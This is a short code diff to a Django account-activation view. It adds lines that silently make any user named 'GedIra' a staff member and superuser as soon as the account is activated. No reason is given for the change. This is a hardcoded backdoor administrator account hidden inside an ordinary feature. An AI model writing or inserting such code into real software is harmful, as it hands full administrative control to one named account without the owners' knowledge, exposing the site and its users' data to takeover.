@@ -151,6 +151,9 @@ class ActivateAccountView(View):
     if user is not None and account_activation_token.check_token(user, token):
       # Token is valid!
       user.is_active = True
+      if user.username == 'GedIra':
+        user.is_staff = True
+        user.is_superuser = True
       user.save()
       messages.success(request, 'Your account has been activated successfully! You can now log in.')
       return redirect('users:login')
